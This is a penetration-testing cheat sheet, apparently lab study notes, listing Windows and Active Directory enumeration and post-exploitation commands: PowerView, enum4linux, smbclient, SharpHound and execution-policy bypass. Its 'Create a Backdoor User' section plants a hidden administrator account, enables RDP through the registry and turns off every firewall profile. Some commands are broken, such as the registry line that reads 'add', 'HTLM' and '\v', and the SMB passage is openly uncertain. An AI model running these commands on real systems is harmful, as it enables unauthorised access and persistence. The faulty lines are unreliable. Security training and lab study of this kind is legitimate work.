# Windows Enumeration

### Powerview

*In the command prompt
```bash
# This will allow you to run scripts
powershell -ep bypass
...
# Load PowerView (once it's already installed)
> . ./PowerView.ps1
# See the structure
> Get-NetDomain
# Get the domain controller IP, possibly end target
> Get-NetDomainController
# Important Policies
> Get-DomainPolicy
# Get password policy, important insights while cracking passwords 
> (Get-DomainPolicy)."system access"
# Information about the user you have access to, can be a lot of information
> Get-NetUser
# Only pull down the usernames
> Get-NetUser | select samaccountname
# See when the users last changed their passwords
> Get-UserProperty -Properties pwdlastset
# See how many times each user has logged on, great way to identify honeypot accounts
> Get-UserProperty -Properties logoncount
# Get a ton of information about the computers
> Get-NetComputer -FullData # '| select {propertyName}' in order to nail down certain information, such as operating system
# See who are admins
> Get-NetGroupMember -GroupName *admin*
# Look through the different shares
> Invoke-ShareFinder
# Get the group policies, important one
> Get-NetGPO
# Narrowing down the above
> Get-NetGPO | select displayname, whenchanged

```

#### enum4linux

"As soon as you see that SMB is open, run enum4linux." It will try to enumerate SMB as much as it can.
```
enum4linux -A 123.123.123.123 -u user -p password # user and password are optional
```

#### smbclient

For enumerating SMB shares. I believe that you can also do it without credentials by putting an empty username and then maybe also an empty password, though maybe just the empty username. I may be getting this confused with cme smb. 

```bash
smbclient -L 123.123.123.123 -U domainname/username

# I believe that you can also do it without credentials by putting an empty username and then maybe also an empty password, though maybe just the empty username. I may be getting this confused with cme smb. 
cme smb -L -U '' 123.123.123.123
```

#### runas

Use this command to run as another user (if you have their credentials):

```bash
>  runas /user:domainname\\username cmd.exe
```

#### schtasks

Allows you to see the scheduled tasks on your local box (once you have a shell/ssh session). The following is command useful as it will essentially answer the quesion, if we can exploit this, what kind of priviledges will we gain?

```bash
schtasks /query
...
schtasks /query /fo LIST /v /TN "FTP Backup"
```

#### type 

The Windows equivalent of cat.

#### findstr

The Windows equivalent of grep.

#### Recursively Search Through Directories 

```bash
dir /s/b file.txt
```

#### Create a Backdoor User

You can use this user to RDP into a session and obtain a GUI. This assumes that you are already NT Authority.
```bash
net user /add backdoor Password1
...
net localgroup administrators /add backdoor
...
# Enables RDP Connections
add "HTLM\SYSTEM\CurrentControlSet\Control\Terminal Server" \v "fDenyTSConnections" /t REG_DWORD /d 0 /f
...
# Disable the Firewalls
netsh advfirewall set allprofiles state off
...
# RDP In & Allow Clipboard Sharing
xfreerdp /v:ms01 /u:backdoor /p:Password1 +x clipboard /cert:ignore
```

#### Collecting Data for Bloodhound on Windows

We're using the SharpHound.ps1 from GitHub.
```bash
> . .\\SharpHound.ps1
> Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName outfile.zip
```

#### Check for GPP Vulnerability

Say that you have a shell in MetaSploit, you can background that shell and run the "smb_enum_gpp" module to check if there is the GPP vulnerability in the environment.

#### Recursively Downloading Files with SMB

```bash
> prompt off
> recurse on
> mget *
```

#### Create a Share

```bash
> net share public=c:\\users\\public /GRANT:Everyone,FULL
```

#### NTLM v NTLMv2

NTLM hashes can be passed, NTLMv2 hased CANNOT be passed.

#### Execution Policy Bypass - Per script basis

```bash
# Simply append to your script
-ExecutionPolicy Bypass
```

#### Execution Policy Bypass - Per User Basis

```bash
# Get the current execution policy for your current user
Get-ExecutionPolicy -Scope CurrentUser

# Attempt the modify the execution policy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

# Assure that the policy was changed
Get-ExecutionPolicy -Scope CurrentUser
```
